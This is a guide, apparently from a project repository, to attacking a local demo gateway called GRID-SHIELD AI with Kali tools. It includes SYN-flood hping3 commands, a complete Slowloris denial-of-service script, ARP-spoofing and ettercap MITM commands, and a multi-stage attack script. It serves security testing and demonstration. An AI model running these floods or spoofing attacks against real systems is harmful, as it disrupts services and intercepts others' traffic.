# Kali Linux Tools Integration Guide

## Overview

This guide explains how to use professional penetration testing tools from Kali Linux to perform advanced security demonstrations against the GRID-SHIELD AI system.

> **⚠️ WARNING**: These tools should only be used in authorized testing environments. Unauthorized use is illegal.

---

## 🛠️ Tool Installation (Linux Mint)

### Install Individual Tools

```bash
# Update package list
sudo apt update

# Install network tools
sudo apt install -y hping3 nmap tcpdump netcat

# Install Python security tools
pip install scapy requests
```

### Install Full Kali Tools (Optional)

```bash
# Add Kali repository (advanced users only)
echo "deb http://http.kali.org/kali kali-rolling main non-free contrib" | sudo tee /etc/apt/sources.list.d/kali.list
wget -q -O - https://archive.kali.org/archive-key.asc | sudo apt-key add -
sudo apt update
sudo apt install -y kali-linux-core
```

---

## 🎯 Attack Scenarios with Kali Tools

### 1. DoS Attack with hping3

**Purpose**: Flood the gateway with TCP/HTTP requests

```bash
# SYN flood attack on port 5002
sudo hping3 -S -p 5002 --flood localhost

# HTTP flood (more realistic)
sudo hping3 -c 10000 -d 120 -S -w 64 -p 5002 --flood --rand-source localhost
```

**Expected Result**: Gateway should handle or rate-limit requests

### 2. Port Scanning with nmap

**Purpose**: Discover open ports and services

```bash
# Basic port scan
nmap -p 5001-5002 localhost

# Service version detection
nmap -sV -p 5001-5002 localhost

# Aggressive scan with OS detection
sudo nmap -A -p 5001-5002 localhost
```

**Expected Result**: Should show ports 5001 (Grid) and 5002 (Gateway) open

### 3. Packet Sniffing with tcpdump

**Purpose**: Capture and analyze network traffic

```bash
# Capture traffic on localhost
sudo tcpdump -i lo port 5002 -w gateway_traffic.pcap

# View captured packets
sudo tcpdump -r gateway_traffic.pcap -A

# Filter HTTP traffic
sudo tcpdump -i lo 'tcp port 5002 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)'
```

**Expected Result**: See HTTP POST requests to `/operator/command`

### 4. Network Scanning with netcat

**Purpose**: Test port availability and send raw data

```bash
# Check if port is open
nc -zv localhost 5002

# Send raw HTTP request
echo -e "GET / HTTP/1.1\r\nHost: localhost\r\n\r\n" | nc localhost 5002

# Test connection persistence
nc -v localhost 5002
```

### 5. Custom Packet Crafting with Scapy

**Purpose**: Create malformed or custom packets

```python
#!/usr/bin/env python3
from scapy.all import *

# Craft custom TCP packet
packet = IP(dst="127.0.0.1")/TCP(dport=5002, flags="S")
send(packet)

# Craft malformed HTTP request
malformed = IP(dst="127.0.0.1")/TCP(dport=5002)/"MALFORMED HTTP REQUEST"
send(malformed)
```

---

## 🔥 Advanced Attack Scenarios

### Scenario 1: Multi-Stage Attack

Combine multiple tools for realistic attack simulation:

```bash
#!/bin/bash
# Multi-stage attack script

echo "Stage 1: Reconnaissance"
nmap -sV -p 5001-5002 localhost

echo "Stage 2: Packet Capture"
sudo tcpdump -i lo port 5002 -w attack.pcap &
TCPDUMP_PID=$!

echo "Stage 3: DoS Attack"
timeout 10 sudo hping3 -S -p 5002 --flood localhost

echo "Stage 4: Cleanup"
kill $TCPDUMP_PID
```

### Scenario 2: Man-in-the-Middle Simulation

```bash
# Set up ARP spoofing (requires 2 machines)
sudo arpspoof -i eth0 -t TARGET_IP GATEWAY_IP

# Capture traffic
sudo tcpdump -i eth0 -w mitm_capture.pcap

# Modify packets (advanced)
sudo ettercap -T -M arp:remote /TARGET_IP// /GATEWAY_IP//
```

### Scenario 3: Slowloris Attack

```python
#!/usr/bin/env python3
"""
Slowloris attack - keeps connections open to exhaust resources
"""
import socket
import time
import random

target = "localhost"
port = 5002
sockets = []

# Create multiple slow connections
for i in range(200):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.send(f"POST /operator/command HTTP/1.1\r\n".encode())
        s.send(f"Host: {target}\r\n".encode())
        sockets.append(s)
        print(f"Socket {i} created")
    except:
        break

# Keep connections alive
while True:
    for s in sockets:
        try:
            s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
        except:
            sockets.remove(s)
    time.sleep(15)
```

---

## 🌐 Remote Attack Setup

### On Target Machine (GRID-SHIELD AI)

1. **Configure firewall:**
   ```bash
   sudo ufw allow from ATTACKER_IP to any port 5002
   sudo ufw allow from ATTACKER_IP to any port 5001
   ```

2. **Verify gateway is listening on all interfaces:**
   ```bash
   # Should show 0.0.0.0:5002
   netstat -tuln | grep 5002
   ```

### On Attacker Machine (Kali Linux)

1. **Update attack simulator:**
   ```python
   # In attack_simulator.py
   GATEWAY_URL = "http://TARGET_IP:5002"
   ```

2. **Test connectivity:**
   ```bash
   curl http://TARGET_IP:5002/
   ```

3. **Launch attacks remotely:**
   ```bash
   # DoS from remote
   sudo hping3 -S -p 5002 --flood TARGET_IP
   
   # Port scan from remote
   nmap -sV -p 5001-5002 TARGET_IP
   ```

---

## 📊 Attack Effectiveness Matrix

| Tool | Attack Type | Detection Method | Success Rate |
|------|------------|------------------|--------------|
| **hping3** | DoS/SYN Flood | Rate Limiting | Low (blocked) |
| **nmap** | Port Scan | Firewall Logs | High (passive) |
| **tcpdump** | Packet Sniffing | N/A (passive) | High |
| **scapy** | Packet Crafting | Protocol Validation | Medium |
| **slowloris** | Resource Exhaustion | Connection Limits | Low |
| **Custom Scripts** | Application-Level | AI + Rules | Low (blocked) |

---

## 🎬 Demo Script with Kali Tools

### Setup (5 minutes before demo)

```bash
# Terminal 1: Start packet capture
sudo tcpdump -i lo port 5002 -w demo_traffic.pcap

# Terminal 2: Launch GRID-SHIELD AI
./start_system.sh

# Terminal 3: Prepare attack tools
sudo hping3 --version
nmap --version
```

### Live Demo (10 minutes)

1. **Show normal operation** (Admin Console)
2. **Launch port scan** (Kali - nmap)
   ```bash
   nmap -sV -p 5001-5002 localhost
   ```
3. **Attempt DoS** (Kali - hping3)
   ```bash
   sudo hping3 -S -p 5002 --flood localhost
   ```
4. **Show attack blocked** (Gateway logs)
5. **Analyze captured traffic** (tcpdump)
   ```bash
   sudo tcpdump -r demo_traffic.pcap -A | less
   ```

---

## 🔒 Security Best Practices

### For Demonstrations

1. **Isolated Network**: Use a separate VLAN or network segment
2. **Firewall Rules**: Restrict access to demo machines only
3. **Logging**: Enable comprehensive logging for post-demo analysis
4. **Cleanup**: Remove firewall rules after demo

### For Production

1. **Disable Attack Simulator**: Remove or restrict access
2. **Strong Authentication**: Implement proper auth mechanisms
3. **Rate Limiting**: Configure appropriate thresholds
4. **IDS/IPS**: Deploy additional intrusion detection

---

## 📝 Logging and Analysis

### View Attack Logs

```bash
# Gateway logs
tail -f logs/cyber.log | grep BLOCKED

# AI analysis logs
tail -f logs/ai.log | grep CRITICAL

# System logs
sudo journalctl -u grid-shield -f
```

### Analyze Packet Captures

```bash
# Convert to readable format
tcpdump -r attack.pcap -A > attack_analysis.txt

# Use Wireshark for GUI analysis
wireshark attack.pcap

# Extract HTTP requests
tcpdump -r attack.pcap -A | grep "POST /operator/command"
```

---

## 🆘 Troubleshooting

### hping3 requires root

```bash
# Add capabilities (alternative to sudo)
sudo setcap cap_net_raw+ep /usr/sbin/hping3
```

### Port already in use

```bash
# Find and kill process
sudo lsof -ti:5002 | xargs kill -9
```

### Firewall blocking attacks

```bash
# Temporarily disable firewall (demo only!)
sudo ufw disable

# Re-enable after demo
sudo ufw enable
```

---

## 📚 Additional Resources

- **Kali Linux Documentation**: https://www.kali.org/docs/
- **hping3 Manual**: http://www.hping.org/manpage.html
- **nmap Guide**: https://nmap.org/book/man.html
- **Scapy Tutorial**: https://scapy.readthedocs.io/

---

## ⚖️ Legal Disclaimer

**IMPORTANT**: These tools and techniques should only be used:
- On systems you own or have explicit permission to test
- In isolated lab/demo environments
- For educational and demonstration purposes
- In compliance with local laws and regulations

Unauthorized access to computer systems is illegal in most jurisdictions.
